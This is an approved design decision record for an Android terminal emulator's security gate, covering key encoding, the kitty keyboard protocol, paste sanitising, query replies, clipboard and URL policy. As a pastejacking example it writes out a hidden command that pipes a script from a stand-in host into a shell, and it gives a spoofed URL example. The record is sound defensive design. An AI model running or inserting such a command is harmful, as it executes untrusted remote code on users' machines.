# The gate: what is sent to the host, replies, the clipboard, and URLs

- Status: Approved
- Date: 2026-10-25
- Related: Requirements 6.1, 6.3, and 6.5 (safe defaults), sections 1, 3.1, 3.3, and 5 of [architecture.md](../design/architecture.md), [gate-policy.md](../design/gate-policy.md), sections 3 and 10 of [emulation.md](../design/emulation.md), sections 4, 6.1, 7.1, and 11 of [compose-input.md](../design/compose-input.md), section 6.3 of [ime-contract.md](../design/ime-contract.md), section 1.3 of [session-and-threads.md](../design/session-and-threads.md), section 4.4 of [boundaries.md](../design/boundaries.md), [0087](0087-public-api.md), [0084](0084-session-and-threads.md), [0039](0039-minsdk-29.md), [0088](0088-build-boundaries-and-tests.md), [0085](0085-compose-interaction.md), [0081](0081-resource-limits.md), [0079](0079-emulation-scope.md), section 10 of [device-checks.md](../device-checks.md) (links taken by a protected activity), `config/boundaries.toml`

## Background

Of the attack types in requirement 6.1, what is sent to the host, replies to queries, the clipboard, and opening URLs are handled by `vtfx-gate`, the only module that creates bytes to send to the host and performs operations with external effects (section 3.3 of [architecture.md](../design/architecture.md)); `vtfx-gate-android` only performs what the gate allowed. The gate modules are under security review and the others (`vtfx-core`, `vtfx-input`, `vtfx-session`, `vtfx-compose`) are not, so the gate must not rely on them for what it allows. The defaults must be on the safe side (requirement 6.5), and the minimum API level is 29 ([0039](0039-minsdk-29.md)).

## 1. Keys are encoded inside the gate

`KeyStroke`, `TerminalKey`, and `KeyModifiers` are value types without behavior in `vtfx-core` (section 3.1 of [architecture.md](../design/architecture.md)). `KeyEncoder` is internal to `vtfx-gate`, and `HostWriter.sendKey` takes a `KeyStroke` and `TerminalModes` and encodes them inside the gate, as mouse reports take a `MouseReport` and mode values (section 2 of [gate-policy.md](../design/gate-policy.md)). There is no check of the shape of key bytes, and in `config/boundaries.toml` `vtfx-gate` still depends only on `vtfx-core`.

`sendKey` sends what xterm encodes, or what flags 1 and 4 of the kitty keyboard protocol encode (topic 2), for a key, its modifiers, and the terminal modes. The encoder's inputs are enums, booleans, and the code points of a character key, written in decimal digits in the `CSI u` forms, so there is no path by which text from the host reaches the output.

`ImeSpecTest` in `vtfx-input` cannot depend on the gate, so it maps the keys in the traces to their bytes in the default modes, as it maps text and DELs into the form the gate sends; the key encoding itself is verified by the gate's `KeyEncoderTest`.

**Why.** For text, pastes, replies, and mouse reports, the gate receives structured values and builds the bytes itself. When keys reached `HostWriter.sendKey` as bytes checked only for the shape of a key (a C0 control, one printable character, CSI, SS3, an ESC prefix), sequences with that shape that no key produces (`ESC [ 200 ~`, `ESC [ I`) got through, so the bytes that could be sent were not determined by the gate alone: it relied on `vtfx-compose`, which is not under review, passing only the output of `KeyEncoder`. The key types are terminal vocabulary defined by core, like `TerminalModes` and `MouseEncoding`; the editing model of `vtfx-input` receives them and the gate encodes them, and core is the module both can refer to.

**Alternatives considered.**
- **Bytes and a shape check**: the gate alone does not determine the bytes that could be sent.
- **Make `vtfx-gate` depend on `vtfx-input` and take `KeyStroke` from there**: relaxes the restriction in `config/boundaries.toml`, and the gate, which needs three types, would depend on the whole module, the IME editing model included.
- **A new module holding only the types**: a module and dependency edges for three types.

**Impact of reversing.** Move the types and `KeyEncoder` back to `vtfx-input`, make the argument of `HostWriter.sendKey` bytes, and restore the shape check. The package of `KeyStroke` and the others changes, so the imports of apps using the public API (`TerminalSession.sendKey`) change too.

## 2. The kitty keyboard protocol

1. **The flags are kept as kitty keeps them**: `CSI = flags ; mode u`, `CSI > flags u`, `CSI < n u`, and the query `CSI ? u`, with a stack for each screen, as the protocol requires, so that a program on the alternate screen does not change the flags of the shell on the main screen; a full stack drops its oldest entry, popping every entry clears the flags, and RIS and DECSTR empty both stacks (sections 3 and 10 of [emulation.md](../design/emulation.md)). The reply to `CSI ? u` is built from the flags, as the other replies are from the state (section 3 of [gate-policy.md](../design/gate-policy.md)).
2. **Flags 1 (disambiguate escape codes) and 4 (report alternate keys) are supported, and the stacks keep only these**, so that the reply to `CSI ? u` tells the program what vtfx does, which is how the protocol says programs detect a terminal that implements part of it. Flag 2 is not supported because it needs the releases and repeats of keys, which `KeyStroke` does not describe and soft keyboards do not send; flags 8 and 16 because they need every key as an escape code, while typed characters reach the host as text through the IME editing model and soft keyboards send no keys at all, so setting them while sending text would mislead the program.
3. **Under flag 1, keys are encoded as kitty encodes them, and under flag 4 character keys sent as `CSI u` report their alternate keys** (section 2.2 of [gate-policy.md](../design/gate-policy.md)). Enter, Tab, and Backspace without modifiers keep their legacy bytes, so that a user can still type `reset` after a program left the flags set; Enter without modifiers still follows LNM, which kitty does not have, so the legacy bytes of Enter are kept whole. DECCKM and DECKPAM give no SS3 forms, as in kitty. Meta is the protocol's Super, which has the same bit as Meta in xterm's parameter.
4. **`KeyStroke.Character` carries the unshifted key and the key of the base layout.** The code of a character key is its unshifted key, so that Ctrl+Shift+1 is `CSI 49 ; 6 u`, and Shift is reported as a modifier; `KeyEventHandler` takes the unshifted key from the keyboard's key character map and the key of the base layout from the scan code (section 7.1 of [compose-input.md](../design/compose-input.md)). The key bars of apps give both themselves; a key that has no place on a keyboard, such as the first character of text that the IME commits while sticky modifiers are armed, takes its character in lower case as the unshifted key and has no key of the base layout. The lock keys are not reported, since `KeyModifiers` has none (kitty, Ghostty, WezTerm, and foot report them; Alacritty and xterm.js do not).
5. **The keys of the numeric keypad follow NumLock, as in kitty, not DECKPAM** (section 7.1 of [compose-input.md](../design/compose-input.md), section 2.2 of [gate-policy.md](../design/gate-policy.md)).
6. **There is no option of the app to turn the protocol off.** A program that leaves the flags set changes the bytes of keys for the programs after it, such as Ctrl+C for the shell, as in kitty.

**Why.** The legacy encoding is ambiguous: Esc is the first byte of every escape sequence, so programs tell a lone Esc from Alt and a key by waiting; Ctrl+I is Tab, Ctrl+M is Enter, Ctrl+Shift+A is Ctrl+A, and Shift+Enter and Ctrl+Enter are Enter. The protocol (<https://sw.kovidgoyal.net/kitty/keyboard-protocol/>) lets a program ask for unambiguous encodings in steps chosen by flags, and Vim, Neovim, Helix, kakoune, fish, and nushell use it; most ask for flag 1, some for 1 and 4. vtfx does not see keys as a desktop terminal does: typed characters reach the host as text through the IME editing model, from soft and hardware keyboards alike (section 6.3 of [ime-contract.md](../design/ime-contract.md)), and corrections are sent as DELs. The terminals that implement the protocol all report the unshifted key of the layout, so that Ctrl+Shift+1 is the `1` key with Shift and Ctrl.

**Alternatives considered.**
- **Every flag**: the protocol encourages it, but vtfx cannot without a `KeyStroke` that describes releases and a path for typed characters that bypasses the IME editing model, which soft keyboards could not use anyway.
- **Keep every flag the program sets and act only on those supported**: the reply to `CSI ? u` would claim flags that vtfx ignores, and the program could not detect it.
- **Flag 1 alone, with the character in lower case as the code**: needs no change to `KeyStroke`, and lower case undoes Shift and Caps Lock for letters, but Ctrl+Shift+1 would be `CSI 33 ; 6 u`, which no other terminal sends, and programs could not match shortcuts across layouts.
- **The key of the base layout from the key code**: Android names key codes after a US keyboard, but the key character maps of other layouts may map scan codes to other key codes, so the key code does not always tell the place of the key.
- **DECSTR keeping the stacks (Ghostty, WezTerm, Windows Terminal, iTerm2), or `CSI < 0 u` popping one entry (Alacritty, xterm.js, foot, iTerm2)**: kitty, which defines the protocol, does otherwise.
- **The keypad following DECKPAM rather than NumLock**: no other terminal consults DECKPAM in the protocol, and kitty does not implement DECKPAM.
- **An option of the app to turn the protocol off**: WezTerm and xterm.js turn it off by default and Windows Terminal has an option, but the host turns it on, a program that exits without popping leaves Enter, Tab, and Backspace working, and nothing has asked for the option.
- **xterm's modifyOtherKeys instead**: stays within what xterm encodes, but does not tell Esc apart and has no query; it was not asked for.
- **Keypad Enter as Enter**: would keep Keypad Enter usable after a program left the flags set, but differs from kitty for a key that phones rarely have.

**Impact of reversing.** To drop the protocol: remove the stacks and the flags of `TerminalModes` from `Emulator`, the query from `TerminalQuery` and `Replies`, and the protocol's encoding from `KeyEncoder`, and `sendKey` again sends only what xterm encodes (topic 1). The unshifted key and the key of the base layout in `KeyStroke.Character`, and the keypad's navigation keys in `TerminalKey`, are public API, and removing them breaks apps. To support more flags: add them to the flags that the stacks keep, the modes, and `KeyEncoder`; flag 2 needs releases in `KeyStroke`, and flags 8 and 16 need typed characters sent as keys.

## 3. Pastes lose every control character

All control characters (C0, DEL, C1) other than HT and line breaks are removed from pastes, and line breaks become CR, whether or not the host enabled bracketed paste mode (section 2.1 of [gate-policy.md](../design/gate-policy.md)).

**Why.** Since no ESC or C1 CSI remains, pasted content cannot contain the end of a bracketed paste to escape from it.

**Alternatives considered.**
- **Remove only the end sequence**: escapes and malfunctions through the C1 CSI (U+009B) or other sequences containing ESC would remain. Removing all control characters is simpler and more reliable.

**Impact of reversing.** Change the conversion in `OutboundText` and the copy of its rule for removing controls in `ImeEditor`, update section 2.1 of [gate-policy.md](../design/gate-policy.md), and update the expected values in `AttackTest` and `HostWriterTest`.

## 4. Replies carry no text from the host

Replies are built only from constants and numbers taken from the terminal state, and there is no path by which strings sent by the host are included in them: `TerminalQuery` holds no host strings. DA1 reports a VT220 with ANSI color, and DA2 reports what Windows Terminal reports (section 3 of [gate-policy.md](../design/gate-policy.md)). Reports of the window title and icon name (XTWINOPS 20, 21), checksums of the screen contents (DECRQCRA), and XTGETTCAP are not answered, and will not be in the future.

**Why.** The title and icon name reports are a classic path for command injection, DECRQCRA is a means of guessing the screen contents, and the replies to XTGETTCAP would include terminfo strings.

**Impact of reversing.** Change the constants of `Replies`, update section 3 of [gate-policy.md](../design/gate-policy.md), and update the expected values in `AttackTest` and `HostWriterTest`.

## 5. OSC 52 is denied by default, and the gate parses the selection

1. **Writes are denied by default.** When an app allows them, a write longer than the limit (64 Ki UTF-16 units by default) is dropped as a whole, to keep the load from huge data in check (section 4.1 of [gate-policy.md](../design/gate-policy.md); the other limits are in [0081](0081-resource-limits.md)).
2. **Reads are denied by default.** When allowed, the content is returned in base64, so it is never interpreted as control sequences.
3. **The gate parses the selection itself**, with its own list of xterm's targets, rather than trusting the list in `vtfx-core`, which is not under security review, and refuses requests whose selection does not parse. The reply to a read spells the selection again from the gate's constants, so no text from the host is part of it (section 4.1 of [gate-policy.md](../design/gate-policy.md)).

**Why.** Allowing writes would rely on the preview of the clipboard that the system shows on each copy, through which the user would notice a rewrite, but that preview exists only from Android 13 (API 33), and the minimum is API 29 ([0039](0039-minsdk-29.md)): on API 29 to 32 a host could silently replace the clipboard (pastejacking), against the safe defaults of requirement 6.5. The clipboard may hold passwords and the like copied in other apps, so reads are denied too.

**Alternatives considered.**
- **Allow writes by default, with a limit**: copying with tmux's OSC 52 would work without configuration, but on API 29 to 32 the user cannot notice a rewrite of the clipboard.
- **Allow writes by default only on API 33 and later**: the default of `GatePolicy`, a JVM class, would depend on the platform it runs on, and the same app would behave differently by device.

**Impact of reversing.** Change the defaults of `GatePolicy` and the checks of `TerminalGate`, update section 4.1 of [gate-policy.md](../design/gate-policy.md), and update the expected values in `AttackTest` and `HostWriterTest`.

## 6. What is written to the clipboard is not marked sensitive

Text written to the clipboard is not marked sensitive (`ClipDescription.EXTRA_IS_SENSITIVE`), whether it comes from OSC 52 or from the user's copy, which goes through the same `ClipboardAccess` (section 4.3 of [gate-policy.md](../design/gate-policy.md)).

**Why.** On Android 13 and later, with the mark the preview masks the content, so the user could tell that the host rewrote the clipboard but not see what it was rewritten to; showing the content lets the user notice the rewrite. A secret copied with OSC 52 (from a password manager on the host and so on) is then shown in the preview for a few seconds, but OSC 52 has no means of telling whether the content is secret, the terminal cannot mask only part of it, and most copies are not secret.

**Alternatives considered.**
- **Mark written content sensitive**: secrets would not be shown in the preview, but the user could not see what a host rewrote the clipboard to.

**Impact of reversing.** Mark what `AndroidClipboard` writes, and update section 4.3 of [gate-policy.md](../design/gate-policy.md).

## 7. The user's copy and paste go through the gate

`TerminalGate` has `copyToClipboard(text)` and `readClipboardForPaste()` for the user's copy and paste. They are for explicit actions of the user, and the OSC 52 policy does not apply to them. `TerminalSession` calls them, sends the pasted text through the IME editing model and `HostWriter.sendPaste`, and does not keep the clipboard: it hands the clipboard and the URL opener to the gate when it is constructed, as it does the connection ([0084](0084-session-and-threads.md)). Section 4.2 of [gate-policy.md](../design/gate-policy.md). With no call to them outside the gate, the boundary check can restrict the members of `ClipboardAccess` and `UrlOpener` to `vtfx-gate`, which calls them, and `vtfx-gate-android`, which implements them (section 4.4 of [boundaries.md](../design/boundaries.md); how it is checked is in [0088](0088-build-boundaries-and-tests.md)).

**Why.** Calls to `ClipboardAccess.write` and `read` from `vtfx-session` would be the only use of a capability outside the gate modules, against pillar 1 of [architecture.md](../design/architecture.md) (other modules do not even hold the references needed to perform operations with external effects) and section 3.3 (vtfx-gate is solely responsible for them). Opening a URL, also a user's action, goes through `TerminalGate.openUrl`, and the pasted bytes through `HostWriter.sendPaste`. While `vtfx-session` called the clipboard, `config/boundaries.toml` could not name `ClipboardAccess` and `UrlOpener`, so a change to `vtfx-session` or `vtfx-compose` that called `UrlOpener.open` without the gate's URL check, or wrote host output to the clipboard, passed the boundary check and was not reported by `scripts/report_protected_changes.py`.

**Alternatives considered.**
- **Reword the architecture to allow the user's clipboard operations in vtfx-session**: no change to the code, but the rule for `ClipboardAccess` could then only allow the whole of `vtfx-session`, so a change that wrote host output to the clipboard without the policy would still pass.

**Impact of reversing.**
- Remove `copyToClipboard` and `readClipboardForPaste` from `TerminalGate`, and make `TerminalSession` keep the clipboard and call it again.
- Remove the rules for `ClipboardAccess` and `UrlOpener` (`restricted_members`) and for `AndroidClipboard` and `AndroidUrlOpener` (`restricted_classes`) from `config/boundaries.toml`, and their cases from `RepositoryClassRulesTest` in `build-logic`.
- Revert sections 3.3 and 5 of [architecture.md](../design/architecture.md) and the KDoc of `ClipboardAccess`.

## 8. Concealed text is not copied or exposed to accessibility

1. **Concealed text (SGR 8) is not copied, not exposed to accessibility services, and not part of the text of an OSC 8 hyperlink** (sections 4, 6.1, and 11 of [compose-input.md](../design/compose-input.md)).
2. **A concealed cell is a blank**, as the display shows it, rather than left out; word selection takes a concealed cell as blank too.
3. **The rule is in `vtfx-compose`** (`visibleTextAt` in `TerminalSelection.kt`), which reads the cells for each of these; `LineSnapshot.text()` of the core keeps giving the characters of the model.

**Why.** A host could show `echo hi` and hide `; curl evil.example | sh` on the same line: a user who copies the line they see and pastes it elsewhere would send the hidden command (pastejacking), and a screen reader would read text that is not on the screen. Preventing pastejacking comes before compatibility with xterm, which copies concealed text, and the rule agrees with links ([0087](0087-public-api.md)) and search ([0085](0085-compose-interaction.md)), which leave concealed cells out as text the user cannot see. As blanks, the copy is what the user sees, the columns of a table stay in place, and blanks at the end of a line are dropped as other blanks are. Apps without a UI may need the characters of the model, so the core keeps them. Text drawn in the background's color cannot be told from the cells and is still copied, as [0087](0087-public-api.md) accepts for links.

**Alternatives considered.**
- **Copy concealed text, as xterm does**: the pastejacking above.
- **Leave the concealed characters out without a blank**: also hides them, but joins the text around them, which then differs from what the display shows (`a`, a concealed `b`, `c` would copy as `ac`).
- **Leave it out in the core, in `LineSnapshot.text()` and `textAt`**: would also hide it from search and links, which already handle it, and from apps that read the model on purpose.

**Impact of reversing.** Copying, the rows' semantics, and the text of hyperlinks would read `textAt` again, and sections 4, 6.1, and 11 of [compose-input.md](../design/compose-input.md) would lose the rule. The tests of concealed text in `TerminalStateTest` and `TerminalSemanticsTest` would be reversed.

## 9. Which URLs are opened

1. **URLs are opened only on an explicit action by the user**, after the UI has shown the actual URL; there is no path that opens one from host output alone. Only `http` and `https` are allowed by default (sections 5.1 and 5.2 of [gate-policy.md](../design/gate-policy.md)).
2. **URLs whose displayed form may differ from where they go are not opened**: those with whitespace, control characters, format characters, surrogates, or other default-ignorable code points, and, for `http`, `https`, `ftp`, `ws`, and `wss`, those with userinfo, a `\`, a `%`, or a character that is not ASCII in the authority (section 5.2 of [gate-policy.md](../design/gate-policy.md)).
3. **The list of default-ignorable code points is generated from the UCD files in the repository**, rather than taken from the runtime.

**Why.** The generated list does not depend on the runtime's Unicode version. Refusing every character that is not ASCII in the authority, rather than only confusable ones, keeps the check independent of a confusables table and of the runtime's Unicode version; a user who needs an internationalized domain can open its punycode form. The authority is checked for the special schemes of the WHATWG URL Standard because browsers parse the authority of all of them the same way: checking only `http` and `https` would let `ftp://good.example@evil.example` through in an app that allowed `ftp`.

**Alternatives considered.**
- **Check the authority of every URL with `//` after the scheme**: would also cover schemes that browsers do not parse as special, whose authority may not be a host at all; the special schemes are the ones whose host the user is meant to read.

**Impact of reversing.** Change the defaults of `GatePolicy` and the checks of `TerminalGate`, update section 5 of [gate-policy.md](../design/gate-policy.md), and update the expected values in `AttackTest`. To check the authority of `http` and `https` only, drop `ftp`, `ws`, and `wss` from the check.

## 10. The URL schemes that `GatePolicy` accepts

1. **`GatePolicy` refuses `file` in `urlSchemes`**, in any case, with `IllegalArgumentException`, and `AndroidUrlOpener` is unchanged: the gate decides which URLs are opened, and `vtfx-gate-android` only performs what the gate allowed (section 5.2 of [gate-policy.md](../design/gate-policy.md)).
2. **`content` stays allowed if an app adds it.**
3. **`GatePolicy` refuses a scheme outside the grammar that `isAllowedUrl` accepts**, with `IllegalArgumentException`.
4. **`GatePolicy` is immutable, also to Java**: `urlSchemes` and `GatePolicy.DEFAULT_URL_SCHEMES` are unmodifiable sets (`Collections.unmodifiableSet`).

**Why.** In apps that target API 24 or later, starting an activity for a `file:` URI throws `FileUriExposedException`, which `AndroidUrlOpener` does not convert into a result (topic 11), so a `file:` link that the host wrote would crash the app after the user confirmed it; whether it is thrown depends on the scheme, which the host chooses, not on which apps are installed. Starting an activity for a `content:` URL does not throw by default, and the app that takes it decides whether it can read it. A scheme outside the grammar, like `https:` or ` https`, matches no URL, so a mistake in the configuration would make every link silently `NotAllowed`. A set that Java code can add to (and Kotlin code by a cast) would change a policy after it was built, or the default of every later policy in the process.

**Alternatives considered.**
- **Convert `FileUriExposedException` into `Refused` in `AndroidUrlOpener`**: no change to `GatePolicy`, but every `file:` link would be offered to the user and then fail, and the opener would take a decision that belongs to the gate. The failure is known when the policy is built, so failing then is earlier.
- **Refuse `content` too**: such links rarely work without a grant of access, but they do not crash the app, and refusing them would take away a scheme that some apps may use.
- **Leave it to the app**: the crash comes from host output, after an action of the user, in a configuration that looks harmless.
- **Return a new copy of the sets on each read**: also safe, but a copy per read for no gain over an unmodifiable set.

**Impact of reversing.**
- Remove the refusal of `file` from `GatePolicy`, its test in `AttackTest.Hyperlinks`, and the sentence in section 5.2 of [gate-policy.md](../design/gate-policy.md), and decide again what `AndroidUrlOpener` does with `FileUriExposedException`; catching nothing brings back the crash.
- Refuse only the empty scheme again, instead of checking the grammar.
- Store the sets without the unmodifiable wrapper; nothing else depends on it.

## 11. What opening a URL returns

1. `UrlOpener.open` returns a `UrlOpenerResult` (`Opened`, `NoApp`, or `Refused`), and `TerminalGate.openUrl` and `TerminalSession.openUrl` return an `OpenUrlResult`: what the `UrlOpener` returned, unchanged, or `NotAllowed` when the gate did not call it, because the policy does not allow the URL or there is no `UrlOpener`. `UrlOpenerResult` is a subtype of `OpenUrlResult`. `canOpenUrl` stays a `Boolean`: whether `openUrl` would get past `NotAllowed` (section 5.3 of [gate-policy.md](../design/gate-policy.md)).
2. `OpenUrlResult` is closed, and [0087](0087-public-api.md) lists it with the other closed types: a new kind of result is added only in a major version, and apps match it exhaustively, without `else`, to tell the user why a confirmed link did not open. The kinds follow what Android documents for starting an activity, and a failure that an opener cannot name is a programming error, not a new kind of result.
3. The results are `data object`s, for a readable `toString`. They have no constructor, `copy`, or `componentN`, which are what [0087](0087-public-api.md) keeps data classes out of the public API for.
4. Failures that the platform documents for what the app's code does are returned as values by the interface the app implements; the implementation converts only the exceptions it expects for them and lets any other propagate, and vtfx catches nothing around the call (section 1.3 of [session-and-threads.md](../design/session-and-threads.md)). `AndroidUrlOpener` converts `ActivityNotFoundException` from `startActivity` into `NoApp` and `SecurityException` into `Refused` (section 6 of [gate-policy.md](../design/gate-policy.md)).

**Why.** When no app takes a link the user confirmed, or the activity that takes it requires a permission that the app does not hold, the app must be able to tell the user why the link did not open, and must not crash. Both are documented outcomes of `startActivity`, not programming errors: they depend on which apps are installed, which the app cannot know beforehand. The app's code does not throw, and an exception from it propagates as a programming error ([0084](0084-session-and-threads.md)), so the outcomes are values. With the opener's result a subtype, an opener cannot return `NotAllowed`, and the gate needs no check to pass the result on.

**Alternatives considered.**
- **Return a `Boolean`**: the smallest change, but the app could not tell the user why a link did not open, and a success flag is what the house rules replace with a type.
- **Catch every exception in `AndroidUrlOpener`, or in the gate, and report a failure**: no crash from any cause, but it swallows programming errors ([0084](0084-session-and-threads.md)).
- **One type for the opener and the gate**: simpler, but an opener could return `NotAllowed`, which the gate would have to check or pass on.
- **An open shape, on which apps must write `else` ([0087](0087-public-api.md))**: new kinds could come in a minor version, but every app would need a generic message, and the kinds are bounded by what the platform documents.
- **A separate result for a session without a `UrlOpener`**: the app decides whether to pass one, so it already knows; `canOpenUrl` does not separate the two either.

**Impact of reversing.**
- Make `UrlOpener.open` return nothing and `openUrl` return a `Boolean` again, and remove `OpenUrlResult` and `UrlOpenerResult`, with their entries in `api/`.
- Decide again what `AndroidUrlOpener` does with `SecurityException`; catching nothing brings back the crash.
- Revert the sample app's messages, [usage.md](../usage.md), the tests in vtfx-gate, vtfx-gate-android, and vtfx-session, the notes in [0087](0087-public-api.md) and [0084](0084-session-and-threads.md), and section 1.3 of [session-and-threads.md](../design/session-and-threads.md).
